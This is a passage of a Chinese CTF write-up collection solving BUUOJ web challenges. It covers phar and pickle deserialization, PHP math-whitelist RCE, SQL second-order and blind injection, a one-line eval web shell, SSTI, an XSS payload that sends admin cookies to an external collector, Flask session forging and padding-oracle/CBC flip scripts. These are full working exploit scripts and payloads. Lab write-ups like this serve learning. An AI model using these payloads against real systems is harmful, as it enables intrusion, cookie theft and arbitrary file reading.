class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; &#125; $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;ä¸è½½&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;å é¤&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; download.php 12345678910111213141516171819202122232425&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header(\"Location: login.php\"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include \"class.php\";ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, \"flag\") === false) &#123; Header(\"Content-type: application/octet-stream\"); Header(\"Content-Disposition: attachment; filename=\" . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo \"File not exist\";&#125;?&gt; delete.php 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header(\"Location: login.php\"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include \"class.php\";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response);&#125; else &#123; Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response);&#125;?&gt; 审计源码第一反应首先是sql注入。但是随即发现不存在可控参数，所以注入无果。接下来重心放在反序列化上。首先需要明确的是，我们源码中并不存在unserialize()函数，但是我们有文件上传点。所以反序列化需要通过上传phar文件并进行phar://伪协议触发。 接下来寻找常见文件读取函数，注意到File类file_get_contents()方法 123public function close() &#123; return file_get_contents($this-&gt;filename);&#125; 确定是可以进行文件读取了。接下来挖掘一下函数的调用。首先close()是File类的方法，而File类只在Filelist类中有调用过。但Filelist中并没有调用close()方法的位置。此时需要注意Filelist类中的两个魔术方法之一： 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; 它将Filelist类中的files数组全部遍历了一遍，并执行对应的func()结果被存进result。之后的__destruct()方法则会将result等等结果打印出来。这一条利用在于：确保了Filelist的对象如果能借此魔术方法调用close()方法，那么它最后销毁时析构函数会打印出我们需要的文件内容。之后再次审计，注意到User类的__destruct()方法 123public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; 原本只是一个同名close()函数，但是此处却存在着可利用之处。假如我们的文件上传的是User类的对象。销毁时自然会执行close()函数。但如果把db设置为Filelist类的对象，那么db-&gt;close()执行时将找不到close()函数，进而执行其files数组里的每一个函数。那么如果files数组里是存在同名函数close的File类对象，就能成功执行文件读取。找到利用链后，exp如下： 1234567891011121314151617181920212223242526272829303132&lt;?phpclass User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;@unlink(\"phar.phar\");$phar = new Phar(\"a.phar\"); $phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); $o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;stopBuffering(); 生成的a.phar修改后缀上传，之后需要找触发方式，此处需要注意一点，在download.php中，设置了目录： 1ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); 而只有delete.php中的目录是在题目给定的文件上传沙盒中的： 1chdir($_SESSION['sandbox']); 故只有delete操作能直接phar://触发反序列化。 (这里的文件读取flag.txt是传统艺能？每次题目都没交代） ikun(python反序列化)结合了很多知识点的一道题目，但是最后一步的python反序列化确实不会，只好去找了找wp。(本来之前打算学下python反序列化的，结果搞忘了hhh) 首先登陆题目发现在迫害cxk，同时底下有许多商品提示需要购买lv6的商品。但是看了半天前几页并没找到lv6商品，由于页数page直接get传值，看来需要脚本爆破一下： 12345678import requestsurl='http://2c771d3e-86f0-4f72-9815-f19dcb4fd51a.node3.buuoj.cn/shop?page='for i in range(0,2000): r=requests.get(url+str(i)) if 'lv6.png' in r.text: print (i) break 之后发现lv6商品，加入到购物车后，准备注册账号并登录购买。显然钱数是不够的，但是却有折扣这一参数被直接post传值。那么修改其值足够小即可。得到一个目录b1g_m4mber。应该是后台地址。访问网址提示需要admin操作权限。这里抓包一下，发现cookie里居然有JWT。看来是比较常见的JWT伪造认证了。(之前在hackthebox某一台靶机中就存在仿造JWT登录的操作，应该说并不难，而且比较好理解)先拿来base64解码，发现存在乱码。可能是因为加了盐值key的原因。那么第一步先爆破下key值：https://github.com/brendan-rius/c-jwt-cracker得到JWTKey 为1Kun,接下来上https://jwt.io/去生成admin的jwt token.可以看到jwt-token一定是xxx.yyy.zzz的形式。且三段各自代表header,paylaod，signature的json数据内容经base64处理。爆破key值修改paylload为admin也是家常便饭。控制台里修改 1document.cookie&#x3D;&quot;JWT&#x3D;xxxxxxxxxxx&quot; 成功登陆。 之后发现源码存在www.zip。可以拿到源码。然后我就不会了…….查wp后发现是python反序列化。具体漏洞在Admin.py： 12345678910111213141516171819202122import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) become可控。这里其实可以把pickle.loads的操作理解为反序列化。而__reduce__这一魔术方法会在对象被pickle时调用。从而可以构造payload: 123456789import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a= urllib.quote(a)print(a) 这里我的exp在本机跑出来结果不知为何是错的。只有用kali才跑出正确的结果传值拿flag Love Math(构造RCE)源码： 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 题目很有意思，达成目的显然是RCE。但是可以发现过滤了很多字符与函数，限制了长度。而白名单内的函数全部是数学函数，黑名单的字符过滤了常见标点。现在要达成RCE需要绕过上的奇淫技巧。 首先有一种思路是分开传值 ，我个人也比较偏好这种做法。具体形式大致是 1?c&#x3D;$_GET[a]&amp;a&#x3D;system(&#39;ls&#39;); 但是此题首先变量名不能随意，只能从白名单中找出可用数学符号作为变量名。此处考虑长度使用pi。然后是考虑，在_GET[]被过滤的情况下能使用什么数学函数达成构造字符串的目的。这里应该首先考虑进制转换函数，因为10进制以上的数都有英文字母作为数码。而假如是36进制数的话，将会拥有1~10加上26个英文字母作为数码，这足以我们拼凑出payload。假如payload是： 1?c&#x3D;($_GET)&#123;0&#125;($_GET)&#123;1&#125;;&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag 那么我们只需构造出_GET字符串。具体倒推方法如下： 1234_GET-&gt;bin2hex(&#39;_GET&#39;)-&gt;5f474554-&gt;hexdec(&#39;5f474554&#39;)-&gt;1598506324#纯数字#需要构造hex2bin()base_convert(&#39;hex2bin&#39;,36,10)-&gt;37907361743 所以 1234$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$pi&#x3D;hex2bin(5f474554);$pi&#x3D;_GET;$$pi&#x3D;$_GET; 故最后payload 1&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag 除此之外还可以构造 1exec(getallheaders()&#123;1&#125;) 在headers里加上 11:cat &#x2F;flag 这一项执行 1$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 由于结果是echo返回的，上面使用逗号可以将两个结果都打印出来。其他思路包括直接构造RCE语句，但是感觉没有上面的方法用起来舒服。看到网上还有其他非常有意思的解法，就不一一列举了。 CyberPunk(二次注入)上来index.php中给了姓名，电话，地址三个框来填。同时还有三个功能：查询，修改，删除。由于查询这一个操作都只要姓名电话，我猜测剩下的地址这个参数可能是通过输入姓名电话对地址进行某种触发式注入。基本可以猜测是sql注入题型。 从源码处得到一个file参数。果断文件包含读到源码：index.php 1234567891011121314&lt;?phpini_set('open_basedir', '/var/www/html/');$file = $_GET[\"file\"];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file))&#123; if (preg_match(\"/phar|zip|bzip2|zlib|data|input|%00/i\",$file)) &#123; echo('no way!'); exit; &#125; @include($file);&#125;?&gt; search.php 1234567891011121314151617181920212223242526272829303132&lt;?phprequire_once \"config.php\"; if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"phone\"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = \"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'\"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); if(!$row) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = \"&lt;p&gt;姓名:\".$row['user_name'].\"&lt;/p&gt;&lt;p&gt;, 电话:\".$row['phone'].\"&lt;/p&gt;&lt;p&gt;, 地址:\".$row['address'].\"&lt;/p&gt;\"; &#125; else &#123; $msg = \"未找到订单!\"; &#125;&#125;else &#123; $msg = \"信息不全\";&#125;?&gt; change.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once \"config.php\";if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"address\"]) &amp;&amp; !empty($_POST[\"phone\"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $address = addslashes($_POST[\"address\"]); $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = \"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'\"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db-&gt;query($sql); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = \"订单修改成功\"; &#125; else &#123; $msg = \"未找到订单!\"; &#125;&#125;else &#123; $msg = \"信息不全\";&#125;?&gt; delete.php 123456789101112131415161718192021222324252627282930313233&lt;?phprequire_once \"config.php\";if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"phone\"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = \"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'\"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $result = $db-&gt;query('delete from `user` where `user_id`=' . $row[\"user_id\"]); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = \"订单删除成功\"; &#125; else &#123; $msg = \"未找到订单!\"; &#125;&#125;else &#123; $msg = \"信息不全\";&#125;?&gt; 审计源码后重点关注address有无注入，发现题目都只对前两个参数进行了过滤，并未检查address。同时address只经过了一次addslashes()就被存储，这是经典的二次注入的使用场景。加上触发方式： 12345678if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db-&gt;query($sql); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; 回显以error的形式被打印出来，证明我们需要使用报错注入。具体形式是，我们提交姓名，电话，地址三个参数，并在地址使用报错注入。之后在change.php再次提交相同姓名电话与随便写地址，即可触发update执行报错注入。根据update语句构造payload: 11&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)# 貌似题目flag不在库里，看wp发现是/flag.txt。有点迷惑。需要注意报错注入字段数的限制，调整substr()的后两个参数。 Easyweb（布尔盲注）开始从robots.txt得到的image.php.bak的源码泄露信息 123456789101112131415161718&lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); 发现有sql注入点，主要要应对两个参数的过滤 12$id&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); 考虑使用\\0，并在path中注入。这样我们的sql语句就变成了: 1select * from images where id&#x3D;&#39; or path&#x3D;&#39; or 1&#x3D;1# 剩下的布尔盲注即可 12345678910111213141516171819import requestsflag=''for i in range(1,50): a=0 print(i)#ciscnfinal, images,users for j in range(32, 128):#select group_concat(column_name) from information_schema.columns where table_name=database() #url = \"http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or%20id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),\"+str(i)+\",1))=\"+str(j)+\",1,0)%23\" url = \"http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or%20id=if(ascii(substr((select group_concat(password) from users),\"+str(i)+\",1))=\"+str(j)+\",1,0)%23\" res = requests.get(url) if 'JFIF' in res.text: flag += chr(j) print(flag) a = 1 break if a==0: break 注入得到username与password登录进入后台。发现一个文件上传点。简单fuzz下发现文件名会被存储到固定php日志文件中logs/upload.b888aaa68e9659c297c4b02084157cff.log.php既然如此只需上传一句话。发现php关键字被拦。使用短标签绕过： 1&lt;?=@eval($_GET['byc']);?&gt; 这是因为 123456&#x2F;&#x2F;php.ini中short_open_tag &#x3D; On &#x2F;&#x2F;除&lt;?php ?&gt;，可使用更灵活的调用方法&lt;? &#x2F;*程序操作*&#x2F; ?&gt;&lt;?&#x3D;&#x2F;*函数*&#x2F;?&gt; bypass掉后执行命令system(&#39;cat /flag&#39;);即可 华东南赛区 Web11（模板注入）这题开始看的我贼奇怪，因为整个网站貌似只是一个api接口。其中回显有一部分十分显眼开始考虑是否存在关于xff头的信息。但是没测出来。去网上搜了波wp恍然大悟。原来关键点在网页下方提示的Build With Smarty !Smarty是一种php网页引擎，也存在如pythonjinja2的ssti注入。 同时其使用方法如{if cmd}{/if}可以执行命令。所以首先bp里更改xff包，尝试2,发现注入成功；之后直接任意命令执行即可拿到flag 1&#123;file_get_contents(&#39;&#x2F;flag&#39;)&#125; 华东北赛区 Web2（存储型xss+sql注入）题目算是比较传统的xss触发模式了。注册登录后一个输入框允许我们使用xsspayload，还有一个界面输入验证码后触发bot阅读。我们目标就是打到admin的cookie。 首先尝试性弹个窗，结果在页面里看到个自己有心理阴影的CSP限制。 1&lt;meta http-equiv=\"content-security-policy\" content=\"default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'\"&gt; 好在csp规则不算比较严格。因为&#39;unsafe-inline&#39; &#39;unsafe-eval&#39;允许我们加载一段内联js代码执行。而解决这个的办法只需使用window.location.href就可绕过。这里因为有buuoj提供的xss平台，所以直接用生成的代码打一打看看。发现有过滤与转换，估计得实体编码绕过。把xss平台生成的payload改成实体编码：(注意id值是生成代码里的id，一开始以为是项目名id半天打不到) 1(function()&#123;window.location.href='http://ip:port/index.php?do=api&amp;id=ex0I6K&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)(); 1&lt;svg&gt;&lt;script&gt;实体编码payload&lt;/script&gt; 提交后访问页面，可以看到平台是能收到cookie的，那就不需要关心其他的，直接去反馈页面跑段脚本爆破验证码提交即可。等待bot点击页面，之后平台收到cookie修改登录进入admin.php后台，一个明显的sql注入直接联合查询即可。3个字段，回显第2,3个 double secrect (ssti)基本上唬人的成分比较大。因为一开始进入题目只有一句Welcome To Find Secret，之后访问robots.txt发现居然报this is android ctf，让我以为看错题了。但其实访问secret路由并传参secret时，发现会有回显。当回显字数多的时候出现python报错，可以猜测是ssti。这里我尝试直接传一段中文，其实ascii码比较大的文字也会触发报错，爆出重要源码： 原来是段加密，而且爆出的源码连key值都给了。那么直接RC4加密我们的ssti payload基本就完事了。exp: 1234567891011121314151617181920212223242526272829303132333435import requestsimport urllibclass RC4: def __init__(self, key): self.key = key self.key_length = len(key) self._init_S_box() def _init_S_box(self): self.Box = [i for i in range(256)] k = [self.key[i % self.key_length] for i in range(256)] j = 0 for i in range(256): j = (j + self.Box[i] + ord(k[i])) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def crypt(self, plaintext): i = 0 j = 0 result = '' for ch in plaintext: i = (i + 1) % 256 j = (j + self.Box[i]) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] t = (self.Box[i] + self.Box[j]) % 256 result += chr(self.Box[t] ^ ord(ch)) return resulturl='http://7318e5d2-ecf4-4961-b115-4f1eb3b11c4a.node3.buuoj.cn/secret?secret='a = RC4('HereIsTreasure')cmd=\"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;\"payload = urllib.parse.quote(a.crypt(cmd))res = requests.get(url + payload)print(res.text) 华东南赛区 Web4 (flask session cookie伪造)被没必要的情况给浪费了时间……主要是环境问题，心里苦啊。首先题目给了一个参数可以读取文件，由于路由名称，先看下源码app.py 1234567891011121314151617181920212223242526272829303132333435# encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! Read somethings' @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response' @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied' if __name__=='__main__': app.run( debug=True, host=\"0.0.0.0\" ) 可以看到只要伪造session[&#39;username&#39;]的值就可以拿到flag了。由于这里的随机数种子SECRECT_KEY很轻松就可以伪造，所以直接上脚本爆破并生成cookie值 1234567891011import flask_session_cookie_manager2import randommac = \"02:42:ae:00:d0:09\"random.seed(int(mac.replace(\":\", \"\"), 16))for x in range(1000): key = str(random.random() * 233) result = flask_session_cookie_manager2.FSCM.decode('eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XljQxQ.zBqq36UiMEIrykW9oqSlvg4wBkw', key) if 'error' not in result: result[u'username'] = 'fuck' print flask_session_cookie_manager2.FSCM.encode(key, str(result)) exit() 理论上改cookie就完事了，但是我白花了一个多小时，因为虚拟机的py2的环境有问题。期间还发现，原来参数不变时生成的cookie也会因为时间原因而不同。当然这并不影响结果。只要是python2理论上就没有问题。最后还是在vps上跑的脚本才拿到flag…… PointSystem(PaddingOracle+cbc翻转)题目难度挺大的，前后还拖了不少时间，最后参考了出题人赵师傅的wp才勉强写出来的。其中涉及PaddingOracle+CBC翻转攻击的知识涉及密码学，自己所知甚少，原来也只套过脚本做过一道paddingoracle的题目。所以先把解题过程放一下，抽空把padding oracle等等加密原理理解下。 首先题目从robots.txt中获取信息，进入swagger-ui.html，可以看到有许多api接口的使用。一开始尝试能否直接在这个界面进行命令执行，比如注册或者ping之类的。但是发现并不可行。不过我们既然知道有注册接口，直接按照格式利用接口注册一个账号就好了。注册后尝试登录，却意外发现存在权限不够的问题。 但是在burpsuite中意外发现了除了一个登录的post包，还有一个get请求了未知的api并返回信息。将登录所返回的一段base64进行解码得到： 1&#123;\"signed_key\":\"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZOzOMzVHlzkkVTuw8vkgQOwMZ2B5Leaq0Gc+rzoKtQdjsiMrpsSBq/QvWKTHYKxBHN0JzlQd6bXhFdSUa4slA7g==\",\"role\":3,\"user_id\":1,\"payload\":\"CHAkpjTggDemZY7gzXBvbR2WeXJ47cfj\",\"expire_in\":1582905111&#125; 而前面的signed_key也进行base64解码的话，会发现内容由明文+密文组合起来了。说明有可能服务器采取cbc模式加密。我们要做的就是paddingoracle破解出结构并cbc翻转一下。padding oracleexp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import timeimport requestsimport base64import jsonhost = \"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn\"def padding_oracle(key): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode['signed_key'] signed_key_decoded = base64.b64decode(signed_key) url = \"http://\" + host + \"/frontend/api/v1/user/info\" N = 16 total_plain = '' for block in range(0, len(signed_key_decoded) // 16 - 1): print(block) token = '' get = b\"\" cipher = signed_key_decoded[16 + block * 16:32 + block * 16] for i in range(1, N+1): for j in range(0, 256): time.sleep(0.2) padding = b\"\".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))]) c = b'\\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher #print(c) token = base64.b64encode(c) user_key_json_decode['signed_key'] = token.decode(\"utf-8\") header = &#123;'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), \"utf-8\"))&#125; res = requests.get(url, headers=header) if '少女' in res.text: print('404 error occured!') time.sleep(15.0) res = requests.get(url, headers=header) if res.json()['code'] == 206: get = (j ^ i).to_bytes(1, 'little') + get print(i,get) break plain = b\"\".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)]) print(plain.decode(\"utf-8\"), \"block=%d\" % block) total_plain += plain.decode(\"utf-8\") print(total_plain) return total_plainplain_text = padding_oracle(\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY2lZV3YrYW9NZi9EV2hvU1laaVFpWTJkanlpV1hJbGNqM2FRTndmajdLNnpvZGwzcUhsb2lPakdxWGhCRTN6UHVTeDMwY2lPdlpMZm5ya2tDZ0ZWRXFRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoic3c4SHByRENncFJHRWZwYzMxY29KME1DR1NkRm90SlgiLCJleHBpcmVfaW4iOjE1ODI5ODYwODB9\")print(plain_text) 由于padding需要频繁请求服务器，buu的靶机期间经常出现404。所以我得在每次出现404时sleep十多秒……太难了，跑了快几小时才好。跑完后得到明文结构 1&#123;\"role\":3,\"user_id\":2,\"payload\":\"sw8HprDCgpRGEfpc31coJ0MCGSdFotJX\",\"expire_in\":1582986080&#125; 既然如此，把role改为1应该就可以解决权限问题。所以cbc翻转下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport base64import jsonhost = \"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn\"def cbc_attack(key, block, origin_content, target_content): user_key_decode = base64.b64decode(key) #print(user_key_decode) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode['signed_key'] #print(signed_key) cipher_o = base64.b64decode(signed_key) #print(cipher_o) if block &gt; 0: iv_prefix = cipher_o[:block * 16] else: iv_prefix = b'' iv = cipher_o[block * 16:16 + block * 16] cipher = cipher_o[16 + block * 16:] iv_array = bytearray(iv) for i in range(0, 16): iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i]) iv = bytes(iv_array) #print(iv) user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher).decode('utf-8') return base64.b64encode(bytes(json.dumps(user_key_json_decode), \"utf-8\"))def get_user_info(key): r = requests.post(\"http://\" + host +\"/frontend/api/v1/user/info\", headers=&#123;\"Key\": key&#125;) if r.json()['code'] == 100: print(\"获取成功！\") #return r.json()['data']def modify_role_plain(key, role): user_key_decode = base64.b64decode(user_key) user_key_json_decode = json.loads(user_key_decode) user_key_json_decode['role'] = role return base64.b64encode(bytes(json.dumps(user_key_json_decode), 'utf-8')).decode('utf-8')print(\"翻转 Key:\")user_key = cbc_attack(\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY0JWN1BLdlJ2UVlGdVUydlppRXRKYlV0NkJWZGRlZUp0Rll2Nnl4dmxpaVhYMTdEcVZ6WXJjVjJEeTloekpaM29Gcm9yV0hUWDh0T2N0bjFITXFSSlBnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoidjByeEZqT2NJZW0xYzNta3o5Q2VINXZYdWxuZ0pES3AiLCJleHBpcmVfaW4iOjE1ODI5OTU2NDh9\", 0, '&#123;\"role\":3,\"user_', '&#123;\"role\":1,\"user_')user_key = modify_role_plain(user_key, 1)print(user_key)print(\"测试拉取用户信息：\")user_info = get_user_info(user_key)print(user_info) 如果测试的返回没有问题的话，我们就可以直接拿payload修改为cookie登录了。实际上页面源码中会提示，预设一个值为Key的cookie,所以我们直接添加Key值cookie,成功登陆。最后就是一个misc型题目了……后台唯一比较有意思 